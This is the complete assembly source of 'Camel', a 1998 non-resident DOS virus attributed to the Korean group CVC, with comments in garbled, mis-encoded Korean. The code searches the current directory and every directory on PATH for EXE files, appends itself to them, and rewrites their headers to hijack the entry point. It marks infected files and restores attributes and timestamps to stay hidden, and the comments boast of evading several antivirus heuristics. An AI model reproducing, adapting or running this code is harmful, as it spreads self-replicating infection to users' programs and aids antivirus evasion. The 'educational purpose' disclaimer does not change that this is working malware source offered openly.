;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;           Camel                             \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Camel
; AV Name    : -
; Author     : ?
; Group      : CVC
; Origin     : Corea
;
; Type : Non Memory resident EXE
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  iœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;      - —¡BÉ¡Ÿ¡· ·¡•·‹¡¤ó·i ÂˆaÐ–”a.
;        ·¡•·Ða“e —¡BÉ¡Ÿ¡“e ¬é¸÷–A´á·¶“e PATHµA ˜aŸe”a. ·©”e, ¤a·¡œá¯aˆa ¯©Ð—
;        –A¡e Ñe¸· —¡BÉ¡Ÿ¡µA ·¶“e *.EXEÌa·©·i ˆqµq¯¡Ç¥ ÒµA ¬é¸÷–A´á ·¶“e ‰w
;        ¡”¡ »¢¸ó ·¡•·Ð¬á Àa‹eÀa‹e(?) ˆqµq¯¡Ç¥”a. ˜¢…µA ­¢•¡ˆa “aŸ¡”a.
;
;      * <‰w¡ˆa ¬é¸÷–A´á ·¶»¡ ´g”a¡e Ñe¸· —¡BÉ¡Ÿ¡¦Èá žËaŒa»¡ ·¡•·¯¡Ç¡a‰¡
;        Ð–“e•A ‹a e –¶”a. ˜aœa¬á ‰w¡ˆa ¬é¸÷–A´á·¶»¡ ´g·a¡e Ñe¸· —¡BÉ¡Ÿ¡ e
;        ˆqµq–E”a.>
;
;      * [¤á‹a] :  e´¢, ‰w¡ˆa " PATH=C:\UTILITY "—w‰Áˆ{·¡ Ðaa e »¡¸÷–A´á ·¶”a
;                 ¡e ‹a —¡BÉ¡Ÿ¡“e ˆqµq¯¡Ç¡»¡ ¡µÐe”a. "
;                 PATH=C:\UTILITY;"Àáœñ {¦¦…µA ';'·¡ ·¶”a¡e ˆqµq¯¡Ç¥”a.
;
;      * <M.EXEa HWP—w‰Á ˆ{·¡ ˆqµq–A“e ¯©Ð—–A»¡ ´g“e Ïa¡‹aœ‘·e ˆqµqµA¬á ¹A¶A
;        Ð´¡ Ða“e•A ‹aœå ¦¦…·i ´a»¢  e—i»¡ ´g´v”a.>
;
;      * WINDOWS EXE Ìa·©·e ˆqµq¯¡Ç¡»¡ ´g“e”a.
;
;      - º—¥¢ˆqµq·i Ï¡Ða‹¡ ¶áÐ¬á Header· 12h(Checksum)µA 'nj'œa“e ¢…¸aµi·i ý
;        ‰¡ ·¡ˆõ·i ÁAÇaÐe”a.
;
;      - ­¢¬÷,¯¡ˆe,i¼aŸi ¶¥œ”¡ ¥¢ŠÐe”a. ­¢¬÷µA ¬w‰Å´ô·¡ ˆqµq.
;
;      - INT 24hŸi ˆa¡À»¡ ´g´v‹¡ ˜¢…µA ¥¢¬a¤w»¡ È“·¡ ¦›·e Ïi¡Ï¡µA¬á“e.
;        ...Óa~
;
;      - ´ñÀ÷a‰A ¹¡¸sÐa‰¡...³i•A´ô“e ¦¦…·¡  g”w~. ”á·¡¬w ­¥”‹¡•¡ ¯°”w.
;        ´é aa »¡¸á¦…Ða‰A  e—i´ö“e»¡ F-PROT µA•¡ ˆñ¬‚·¡ ´e–E”a.
;        (TBAVµA“e –E”w~)
;
;      - »¡‹q ”a¯¡  e—i‰¡ ·¶¯s“¡”a. ŒiqÐa‰A¶a....ËbÓ¡ ˆqµq¯¡Ç¡“e Ïa¡¯¡¹aŸi...
;
;                                                 Ñ¡œwa§¡....
;
; Heuristic Test : AVP,DrWeb,DSAV,TBAV µA¬á »¥”e
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

_size         EQU      V_end - V_start
Camel         SEGMENT
              ASSUME   CS:Camel, DS:Camel

              ORG      100h

V_start:      PUSH     DS ES

              MOV      SI,2Ch                   ; ÑÅ‰w¥e®ˆa ¸á¸w–A´á ·¶“e º­¡Ÿi
              MOV      AX, word ptr DS:[SI]     ;  ´è“e”a. PSP· 2ChµA ‹a º­¡ˆa...

              PUSH     CS CS
              POP      DS ES

              DB       0E8h, 4, 0               ; •IÈaµ³­U·i ‰¬e
Delta:                                          ;
              DB       4 DUP (90h)              ;-> ·¡¦¦…·i »¡¶¡e F-PROTµA
              POP      BP                       ;    ˆñ¬‚–E”a. (µá‹aœéŒaa??)
              NOP                               ;
              SUB      BP, offset Delta         ;

              PUSH     AX                       ;

              MOV      AH,19h                   ; Ñe¸· —aœa·¡§aŸi ŠÐe”a.
              INT      21h                      ;
              MOV      byte ptr oDrive[BP],AL   ;

              MOV      AH,47h                   ; Ñe¸· —¡BÉ¡Ÿ¡Ÿi ŠÐe”a.
              XOR      DL,DL                    ;
              LEA      SI, oDIR[BP+1]           ;
              INT      21h                      ;
              MOV      byte ptr oDIR[BP],'\'    ;

                                                ; ‰w¡Ÿi ¸á¸wÐa“e ¦¦….
              POP      ES                       ;   qµA ´e—e”a.
              XOR      SI,SI                    ;
              MOV      CX,512                   ;
get_path:     CMP      word ptr ES:[SI], 'AP'   ;
              JZ       ok_001                   ;
not_:         INC      SI                       ;
              LOOP     get_path                 ;
              MOV      found_path[BP],0         ;
              JMP      end_path                 ;
ok_001:       CMP      word ptr ES:[SI+2], 'HT' ;
              JZ       ok_002                   ;
              JMP      not_                     ;
ok_002:       CMP      byte ptr ES:[SI+4], '='  ;
              JZ       ok_003                   ;
              JMP      not_                     ;
ok_003:                                         ;
              ADD      SI,+5                    ;
              XOR      DI,DI                    ;
              CMP      byte ptr ES:[SI],0
              JNZ      save_PATH
              MOV      found_PATH[BP],0
              JMP      end_path
save_PATH:    MOV      found_PATH[BP],1
Loop_path:    MOV      AL, byte ptr ES:[SI]     ;
              INC      SI                       ;
              CMP      AL,0                     ;
              JZ       end_path                 ;
              MOV      thePATH[BP+DI],AL        ;
              INC      DI                       ;
              JMP      Loop_path                ;
end_path:
              PUSH     DS                       ;
              POP      ES                       ;

              LEA      SI, oIP[BP]              ; ¥e®Ÿi ”a¯¡ ¬é¸÷Ðe”a.
              LEA      DI, _IP[BP]              ; {µA 0EAhµÁ ÐqA ¸ñÏa¡ww·i µÅ¬÷.
              MOV      CX,4                     ;
          rep MOVSW                             ;

              MOV      AH,1Ah                   ; DTAŸi ¬é¸÷Ðe”w.
              LEA      DX, DTA[BP]              ;
              INT      21h                      ;
;------------------------------------------------------------------------;
              CALL     INFECT                   ; Ñe¸ —¡BÉ¡Ÿ¡Ÿi ˆqµq

              CMP      found_path[BP],1         ; ¬é¸÷–E ‰w¡Ÿi Àx´v“e»¡· µa¦Ÿi
              JNZ      Chg_path_2               ;  ˆñ¬a.

Chg_path_1:   XOR      SI,SI                    ; <‰w¡Ÿi Àx´v·i ˜· žË¥>
              LEA      DI,path_START[BP]        ;
              MOV      byte ptr path_CNT[BP],1  ;  ˆbˆb· ˆõ—i·e ';'·a¡ Š¦…–A“¡Œa
              MOV      AX,SI                    ;   ‹a ¦¦…·i 0·a¡ ”Ã¡Ðe”a.
              STOSB                             ;    (´a¯aÇ¡»a Ñw¯¢·a¡ ‰¡Ã¡a“¡..)
                                                ;
divide_path:  INC      SI                       ;  ‹iŠ ';'”a·q· µ³­U·i Àa‰¢Àa‰¢
              CMP      byte ptr thePATH[BP+SI],';'             ;   ¸á¸wÐe”a. (‹a¦¦…·¡ µ«‹© —¡BÉ¡
              JNZ      path_001                 ;    Ÿ¡· ¯¡¸b º­¡ˆa –A“¡Œa..)
              MOV      byte ptr thePATH[BP+SI],0;
              MOV      AX,SI                    ;  ´qËe ¢…¹A¸ñ·¡  g·e ¦¦…·¡”w.
              INC      AX                       ;
              STOSB                             ;
              INC      byte ptr path_CNT[BP]    ;
              JMP      divide_path              ;
                                                ;
path_001:     CMP      byte ptr thePATH[BP+SI],0;
              JNZ      path_002                 ;
              JMP      complete                 ;
path_002:     JMP      divide_path              ;


complete:     MOV      CL, byte ptr path_CNT[BP]
              XOR      CH,CH

              LEA      SI, path_START[BP]
Chg_again:    LODSB
              XOR      AH,AH
              MOV      DI,AX

              LEA      DX, thePATH[BP+DI]

              CALL     Chg_dir                  ; —¡BÉ¡Ÿ¡Ÿi ¥e‰wÐe”a.
              JNC      sub_inf
              JMP      the_next

sub_inf:      CALL     INFECT                   ; ˆqµq¯¡Ç¥”a.

the_next:     LOOP     Chg_again

              MOV      DL, byte ptr oDrive[BP]  ; ¶¥œ· —aœa·¡§a/—¡BÉ¡Ÿ¡¡...
              XOR      DH,DH                    ;
              CALL     Chg_Drv                  ;
                                                ;
              LEA      DX, oDir[BP]             ;
              CALL     Chg_dir                  ;

Chg_path_2:                                     ; Ñe¸· —¡BÉ¡Ÿ¡¦Èá ROOTŒa»¡
                                                ; ·¡•·¯¡Ç¡¡e¬á ˆqµq¯¡Ç¡“e ¦¦…·i
                                                ;  e—ia‰¡ Ð–“e•A......

;========= pass control to the host             ; Ïa¡‹aœ‘· ¹A´áŸi Ñ¡¯aËaµA‰A...

              POP      ES DS                    ;

              MOV      AH,1Ah                   ;
              MOV      DX,80h                   ;
              INT      21h                      ;

              PUSH     DS                       ;
              POP      ES                       ;

              MOV      AX,ES                    ;
              ADD      AX,10h                   ;

              ADD      word ptr cs:_CS[BP],AX   ;

              ADD      word ptr cs:_SS[BP],AX
              MOV      SS,AX
              MOV      SP, word ptr cs:_SP[BP]
                                                ; ¸ñÏa¡ww·¡”w, (FAR)
              DB       0EAh

_IP           DW       ?
_CS           DW       ?
_SS           DW       ?
_SP           DW       ?

oIP           DW       ?
oCS           DW       0FFF0h
oSS           DW       0FFF0h
oSP           DW       ?

Target_01     DB       '*.E?E',0

Chg_drv       PROC
              PUSH     AX DX
              MOV      AH,0Eh
              INT      21h
              POP      DX AX
              RET
Chg_drv       ENDP

;*---------
Chg_dir       PROC
              PUSH     AX DX
              MOV      AH,3Bh
              INT      21h
              POP      DX AX
              RET
Chg_dir       ENDP

;************************************************************************
INFECT        PROC                              ; ˆa¸w  qµA ´e—a“e ¦¦…...         ;*
              PUSH     AX
              PUSH     BX
              PUSH     CX
              PUSH     DX
              PUSH     SI
              PUSH     DI
              PUSH     SP
              PUSH     BP
              PUSH     DS
              PUSH     ES
              PUSH     SS

Search_file:  MOV      AH,4Eh                   ;    Ìa·© Àx‹¡.
              MOV      CX,27h                   ;
              LEA      DX, Target_01[BP]        ;
              INT      21h                      ;

              JNC      pass_001                 ;                                  ;*
              JMP      end_inf                  ;                                  ;*
                                                                                   ;*
pass_001:     LEA      SI, DTA[BP+15h]          ; ­¢¬÷/¯¡ˆe/i¼aŸi ¸á¸w.
              LEA      DI, Attr[BP]             ;
              MOVSB                             ;
              MOVSW                             ;
              MOVSW                             ;

              MOV      AX,4301h                 ; ­¢¬÷ Ð¹A.
              XOR      CX,CX                    ;
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
                                                                                   ;*
              MOV      AX,3D02h                 ; µ¡Ïe
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
              XCHG     AX,BX                    ;

              MOV      AH,3Fh                   ; Ð”áŸi ·ª“e”a.
              MOV      CX,1Ah                   ;
              LEA      DX, Header[BP]           ;
              INT      21h                      ;
                                                                                   ;*
              CMP      word ptr Header[BP],'ZM' ; »¥¼a EXEÌa·©·¥»¡Ÿi ˆñ¬aÐa“e ¦¦….
              JZ       pass_002                 ;  (EXEÌa·©·e MZ¡ ¯¡¸bÐe”a. ZM•¡ ·¶
              CMP      word ptr Header[BP],'MZ' ; ”a‰¡ Ða“e•A..¡µ¥Ö”a)
              JZ       pass_002                 ;
              JMP      next                     ;

pass_002:     CMP      word ptr Header[BP+12h],'nj'            ; ·¡£¡ ˆqµq–E Ìa·©·¥»¡Ÿi ˆñ¬a....
              JNE      pass_003                 ;
              JMP      next                     ;

pass_003:     CMP      byte ptr Header[BP+18h],'@'             ; Ð”á· 18hµA ‰©¤—·¡(@)ˆa ·¶“e ˆå
              JNE      no_win                   ;  ¶å•¡¶ Ìa·©·¡”w.
              JMP      next                     ;
                                                ; Ð”á· ·©¦¦…(SS/SP/IP/CS)Ÿi ¸á¸w.
no_win:       LEA      SI, Header[BP+0Eh]       ;
              LEA      DI, oSS[BP]              ;
              MOVSW                             ;
              MOVSW                             ;
              LEA      SI, Header[BP+14h]       ;
              LEA      DI, oIP[BP]              ;
              MOVSW                             ;
              MOVSW                             ;

              MOV      AX,4202h                 ; Í¡·¥ÈáŸi {·a¡ ·¡•·
              XOR      CX,CX                    ;
              MOV      DX,CX                    ;
              INT      21h                      ;
              PUSH     DX AX BX                 ; Ìa·©· Ça‹¡ £¹ Ð…—i·i ¸á¸w

pass_004:                                       ; ¬¡¶… CS,IPˆt·i ‰¬eÐe”a.
              MOV      BX, word ptr Header[BP+08h]             ;-> Ð”á· Ça‹¡Ÿi ŠÐe”a(Ìœá‹aœÏa)

              MOV      CL,4                     ;-> ŠÐe Ð”á· Ça‹¡Ÿi ¤a·¡Ëa¡
              SHL      BX,CL                    ;   ¤aŽ…”a. (Ìœá‹aœÏa“e 16byte)

              SUB      AX,BX                    ;-> Ìa·©· Ça‹¡µA¬á Ð”á· Ça‹¡Ÿi
              SBB      DX,0                     ;   ¨…”a.

              MOV      CX,16                    ;* ·¡¹A ·¡ˆõ·i ”a¯¡ Ìœá‹aœÏa Ñw¯¢
              DIV      CX                       ;  ·a¡ ¤aŽ…”a. ´aŒaœw ¤e”ž 16·a¡
                                                ;  a’¡e –E”a.
              MOV      word ptr Header[BP+0Eh], AX             ; SS
              MOV      word ptr Header[BP+10h], 0FFFEh         ; SP
              MOV      word ptr Header[BP+14h], DX             ; IP
              MOV      word ptr Header[BP+16h], AX             ; CS
              MOV      word ptr Header[BP+12h], 'nj'           ; ChecksumµA njŸi ý“e”a.(º—¥¢ˆqµq·i
                                                ; Ï¡Ða‹¡ ¶áÐ¬á..)
pass_005:     POP      BX AX DX                 ; Ìa·©· Ça‹¡ £¹ Ð…—i·i ”a¯¡ ¥¢Š.

pass_006:                                       ; < ÍA·¡»¡µÁ a á»¡ ¤a·¡Ëa(?) ‰¬e >- EXEÌa·©· Ð”á· 02hµÁ 04h¡ Ìa·©· Ça‹¡Ÿi ´i ® ·¶”a.
              ADD      AX, _size                ;1. Ìa·©· Ça‹¡µA ¤a·¡œá¯a· Ça‹¡Ÿi
              ADC      DX,0                     ;   ”áÐe”a.

              MOV      CX,512                   ;2. ‹a ˆt·i 512¡ a’…”a.(ÍA·¡»¡“e Ða
              DIV      CX                       ;   a”w 512¤a·¡Ëa)

              OR       DX,DX                    ;3. a á»¡ˆa 0·¡ ´a“¡œa¡e ÍA·¡»¡Ÿi ¤e
              JE       no_inc                   ;   µ©Ÿ± Ð´¡ Ðe”w. ‹aœ¬á 1·i »wˆa.
              INC      AX                       ;
no_inc:
              MOV      word ptr Header[BP+04h],AX              ;4. ÍA·¡»¡“e Ð”á· 04hµA
              MOV      word ptr Header[BP+02h],DX              ;5.  a»¡ b ÍA·¡»¡· a á»¡ ¤a·¡Ëa ˆt·ee.
                                                               ;   02hµA ý“e”a.
pass_007:     MOV      AH,40h                   ; ¤a·¡œá¯aŸi ³e”a.
              MOV      CX, _size                ;
              LEA      DX, V_start[BP]          ;
              INT      21h                      ;

              MOV      AX,4200h                 ; Ìa·© Í¡·¥ÈáŸi Àá·q·a¡ ·¡•·
              XOR      CX,CX                    ;
              MOV      DX,CX                    ;
              INT      21h                      ;

              MOV      AH,40h                   ; µaÈ..®¸÷Ð ‘½·e Ð”áŸi ³e”a.
              MOV      CX,1Ah                   ;
              LEA      DX, Header[BP]           ;
              INT      21h                      ;

              MOV      CX, Time[BP]             ; ¯¡ˆe/i¼a· ¥¢Š
              MOV      DX, Date[BP]             ;
              MOV      AX,5701h                 ;
              INT      21h                      ;
                                                                                   ;*
next:         MOV      AH,3Eh                   ; ”h‹¡
              INT      21h                      ;
                                                                                   ;*
              MOV      AX,4301h                 ; ­¢¬÷ ¥¢Š
              XOR      CH,CH                    ;
              MOV      CL, Attr[BP]             ;
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
                                                                                   ;*
              MOV      AH,4Fh                   ; ”a·qÌa·©·i Àx“e”a.               ;*
              INT      21h                      ;                                  ;*
              JC       end_inf                  ;                                  ;*
              JMP      pass_001

end_inf:      POP      SS
              POP      ES
              POP      DS
              POP      BP
              POP      SP
              POP      DI
              POP      SI
              POP      DX
              POP      CX
              POP      BX
              POP      AX

              ret                                                                                 ;*
INFECT        ENDP                                                                                ;*
;******************************************************************************
V_end:

oDrive        DB       ?
oDir          DB       ?
              DB       63 DUP (?)

Attr          DB       ?
Time          DW       ?
Date          DW       ?

found_path    DB       0

thePATH       DB       384 DUP (?)

path_CNT      DB       ?
path_START    DB       20 DUP (?)

Header        DB       1Ah DUP (?)
DTA:

Camel         ENDS
              END      V_start
